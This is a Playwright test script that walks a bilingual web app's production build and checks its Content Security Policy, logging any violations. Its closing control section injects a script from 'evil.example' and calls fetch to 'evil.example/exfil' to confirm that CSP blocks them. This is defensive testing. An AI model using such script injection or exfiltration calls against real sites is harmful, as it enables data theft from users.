// İNCELEME-57 (fe-fb) — CSP walk on the prod build. Usage: SP=… BASE=… EX=… node walk57.cjs [r2]
const { createRequire } = require('module');
const req = createRequire(process.env.W + '/package.json');
const { chromium } = req('@playwright/test');
const fs = require('fs');
const SP = process.env.SP, BASE = process.env.BASE, MODE = process.argv[2] || 'main';
const tok = fs.readFileSync(`${SP}/tok.txt`, 'utf8').trim();
const violations = []; const log = [];
const note = (s) => { log.push(s); console.log(s); };
fs.mkdirSync(`${SP}/shots`, { recursive: true });
const step = { name: '' };

async function consent(page) {
  const d = page.locator('[aria-labelledby="cookie-title"]');
  if (await d.isVisible().catch(() => false)) {
    const b = d.getByRole('button', { name: /reddet|reject|gerekli|necessary/i }).first();
    await (await b.count() ? b : d.locator('button').first()).click(); await page.waitForTimeout(300);
  }
}
async function wire(page) {
  await page.exposeFunction('__csp', (v) => violations.push({ step: step.name, ...v }));
  await page.addInitScript(() => document.addEventListener('securitypolicyviolation', (e) =>
    window.__csp({ directive: e.violatedDirective, blocked: e.blockedURI, source: e.sourceFile, disposition: e.disposition })));
  page.on('console', (m) => { if (/Content Security Policy|Refused to/i.test(m.text())) violations.push({ step: step.name, console: m.text().slice(0, 300) }); });
  page.on('pageerror', (e) => note(`[${step.name}] pageerror: ${e.message.slice(0, 200)}`));
}
const shot = (p, n) => p.screenshot({ path: `${SP}/shots/${n}.png` });

async function r2Mode(browser) {
  const ctx = await browser.newContext();
  await ctx.addCookies([{ name: 'authjs.session-token', value: tok, url: BASE, httpOnly: true, sameSite: 'Lax' }]);
  let r2Hit = null;
  await ctx.route(/r2\.cloudflarestorage\.com/, (r) => { r2Hit = r.request().url(); return r.fulfill({ status: 200, body: '' }); });
  const p = await ctx.newPage(); await wire(p);
  step.name = 'r2-evidence-upload';
  const r = await p.goto(`${BASE}/tr/main/evidence`, { waitUntil: 'networkidle' });
  note(`evidence status=${r.status()} connect-src=${/connect-src[^;]*/.exec(r.headers()['content-security-policy'])[0]}`);
  await consent(p);
  await p.getByRole('button', { name: /Yeni Belge Yükle/ }).first().click();
  await p.locator('input[type=file]').setInputFiles(`${SP}/min.pdf`);
  await p.locator('form input[type=text]').first().fill('fefb-i57 r2 pdf');
  await p.locator('form button[type=submit]').click();
  await p.waitForTimeout(4000);
  note(`request reached network (route)=${r2Hit ? new URL(r2Hit).origin : 'NO'}`);
  note(`row visible=${await p.getByText('fefb-i57 r2 pdf').first().isVisible().catch(() => false)}`);
  await shot(p, 'r2-upload');
}

async function main(browser) {
  // --- A. Signed out, desktop, tr + en ---
  const anon = await browser.newContext();
  let googleUrl = null;
  await anon.route(/accounts\.google\.com/, (r) => { googleUrl = r.request().url(); return r.abort(); });
  const a = await anon.newPage(); await wire(a);
  for (const path of ['/tr', '/en', '/tr/fiyatlandirma', '/en/blog', '/tr/calls/turkey', '/en/login']) {
    step.name = 'public ' + path;
    const r = await a.goto(BASE + path, { waitUntil: 'networkidle' }); await consent(a);
    note(`${path} status=${r.status()} lang=${await a.evaluate(() => document.documentElement.lang)}`);
  }
  await shot(a, '1-en-login');
  step.name = 'google';
  await a.goto(`${BASE}/tr/login`, { waitUntil: 'networkidle' }); await consent(a);
  await a.getByRole('button', { name: /Google ile Devam Et/ }).click();
  await a.waitForTimeout(4000);
  note(`google redirect=${googleUrl ? new URL(googleUrl).origin + new URL(googleUrl).pathname : 'NO'}`);

  // --- B. Public form (fon-hazirlik) at 390 px: client state machine = hydration proof ---
  const mob = await browser.newContext({ viewport: { width: 390, height: 844 }, isMobile: true, hasTouch: true });
  const m = await mob.newPage(); await wire(m);
  let printed = 0; await m.exposeFunction('__printed', () => { printed++; });
  await m.addInitScript(() => { window.print = () => window.__printed(); });
  step.name = 'fon-hazirlik 390';
  await m.goto(`${BASE}/tr/fon-hazirlik`, { waitUntil: 'networkidle' }); await consent(m);
  await shot(m, '2-fon-hazirlik-390');
  for (let i = 0; i < 9 && !(await m.locator('#lead-name').isVisible().catch(() => false)); i++) {
    const names = await m.locator('main input[type=radio]').evaluateAll((els) => [...new Set(els.map((e) => e.name))]);
    for (const n of names) await m.locator(`main input[type=radio][name="${n}"]`).first().check({ force: true });
    await m.locator('main button[type=submit]').first().click();
    await m.waitForTimeout(700);
  }
  note(`readiness result reached=${await m.locator('#lead-name').isVisible()}`);
  await m.fill('#lead-name', 'fefb i57'); await m.fill('#lead-email', 'fefb-i57@example.test');
  if (await m.locator('#lead-organisation').count()) await m.fill('#lead-organisation', 'fefb i57 org');
  await m.locator('input[name=consent]').check({ force: true });
  await m.locator('section[aria-labelledby=lead-heading] button[type=submit]').click();
  await m.waitForTimeout(2500);
  note(`lead form success box=${await m.locator('section.border-ok[aria-labelledby=lead-heading]').isVisible().catch(() => false)}`);
  await m.getByRole('button', { name: /yazdır|print/i }).first().click().catch(() => {});
  note(`print button → window.print called=${printed}`);
  const sw = await m.evaluate(() => document.documentElement.scrollWidth);
  note(`390px scrollWidth=${sw}`);
  await shot(m, '3-fon-hazirlik-result-390');

  // --- C. Signed in ---
  const ctx = await browser.newContext({ acceptDownloads: true });
  await ctx.addCookies([{ name: 'authjs.session-token', value: tok, url: BASE, httpOnly: true, sameSite: 'Lax' }]);
  const p = await ctx.newPage(); await wire(p);
  step.name = 'dashboard';
  const r2 = await p.goto(`${BASE}/tr/main/dashboard`, { waitUntil: 'networkidle' }); await consent(p);
  note(`dashboard status=${r2.status()} url=${p.url()}`);
  await shot(p, '4-dashboard');
  step.name = 'client-nav';
  await p.evaluate(() => { window.__spa = 1; });
  const link = p.locator('a[href$="/tr/main/kanitlar"]').first();
  note(`sidebar evidence link count=${await p.locator('a[href$="/tr/main/kanitlar"]').count()}`);
  await link.click(); await p.waitForURL(/\/(kanitlar|evidence)/); await p.waitForLoadState('networkidle');
  note(`client-side nav kept window (no full reload)=${await p.evaluate(() => window.__spa === 1)}`);
  step.name = 'evidence-upload (mock)';
  await p.getByRole('button', { name: /Yeni Belge Yükle/ }).first().click();
  await p.locator('input[type=file]').setInputFiles(`${SP}/min.pdf`);
  await p.locator('form input[type=text]').first().fill('fefb-i57 pdf');
  await p.locator('form button[type=submit]').click();
  await p.waitForTimeout(3000);
  note(`uploaded row visible=${await p.getByText('fefb-i57 pdf').first().isVisible().catch(() => false)}`);
  await shot(p, '5-evidence');
  step.name = 'docx';
  const r4 = await p.goto(`${BASE}/tr/main/opportunities/demo-opp-1/documents`, { waitUntil: 'networkidle' });
  await consent(p);
  await p.locator('a[href*="format=docx"]').first().waitFor({ timeout: 30000 });
  note(`documents status=${r4.status()} docx links=${await p.locator('a[href*="format=docx"]').count()}`);
  const dlp = new Promise((res) => { p.on('download', res); ctx.on('page', (np) => np.on('download', res)); });
  await p.locator('a[href*="format=docx"]').first().click();
  const dl = await Promise.race([dlp, new Promise((_, rej) => setTimeout(() => rej(new Error('no download')), 20000))]);
  await dl.saveAs(`${SP}/export.docx`);
  note(`docx name=${dl.suggestedFilename()} bytes=${fs.statSync(`${SP}/export.docx`).size} PK=${fs.readFileSync(`${SP}/export.docx`).subarray(0, 2).toString() === 'PK'}`);
  step.name = 'print-html';
  const pp = await ctx.newPage(); await wire(pp);
  let pr = 0; await pp.exposeFunction('__pr', () => { pr++; });
  await pp.addInitScript(() => { window.print = () => window.__pr(); });
  const r5 = await pp.goto(`${BASE}/api/documents/export?type=NDA&format=pdf&opportunityId=demo-opp-1&locale=tr`, { waitUntil: 'load' });
  note(`print page status=${r5.status()} csp=${(r5.headers()['content-security-policy'] || '').slice(0, 40)}`);
  await pp.locator('[onclick="window.print()"]').first().click(); await pp.waitForTimeout(300);
  note(`print onclick ran=${pr}`);
  await shot(pp, '6-print');
  step.name = 'dashboard 390 en';
  await p.setViewportSize({ width: 390, height: 844 });
  await p.goto(`${BASE}/en/main/dashboard`, { waitUntil: 'networkidle' });
  note(`en dashboard lang=${await p.evaluate(() => document.documentElement.lang)} scrollWidth=${await p.evaluate(() => document.documentElement.scrollWidth)}`);
  await shot(p, '7-dashboard-en-390');

  // --- D. Positive controls (must be blocked) ---
  step.name = 'CONTROL';
  await p.setViewportSize({ width: 1280, height: 800 });
  await p.route(`${BASE}/tr/main/dashboard`, async (route) => {
    const resp = await route.fetch();
    const body = (await resp.text()).replace('<head>', '<head><script>window.__injected=1</script><script src="https://evil.example/x.js"></script>');
    await route.fulfill({ response: resp, body });
  });
  await p.goto(`${BASE}/tr/main/dashboard`, { waitUntil: 'networkidle' });
  // Hydration proof after injection: user menu button opens a menu (React onClick).
  const menuBtn = p.locator('button[aria-haspopup], button[aria-expanded]').first();
  const before = await menuBtn.getAttribute('aria-expanded').catch(() => null);
  await menuBtn.click().catch(() => {}); await p.waitForTimeout(400);
  const after = await menuBtn.getAttribute('aria-expanded').catch(() => null);
  note(`control: injected inline ran=${await p.evaluate(() => window.__injected === 1)}; aria-expanded ${before}→${after} (React handlers live)`);
  await p.unroute(`${BASE}/tr/main/dashboard`);
  await p.evaluate(() => fetch('https://evil.example/exfil').catch(() => {}));
  await p.waitForTimeout(800);
}

(async () => {
  const browser = await chromium.launch({ executablePath: process.env.EX });
  try { MODE === 'r2' ? await r2Mode(browser) : await main(browser); }
  finally { await browser.close(); }
  const outside = violations.filter((v) => v.step !== 'CONTROL');
  note(`CSP violations total=${violations.length} (outside CONTROL=${outside.length})`);
  for (const v of violations) note(JSON.stringify(v));
  fs.writeFileSync(`${SP}/walk57-${MODE}.json`, JSON.stringify({ log, violations }, null, 2));
})().catch((e) => { console.error('WALK FAILED', e); fs.writeFileSync(`${SP}/walk57-${MODE}.json`, JSON.stringify({ log, violations, error: String(e) }, null, 2)); process.exit(1); });
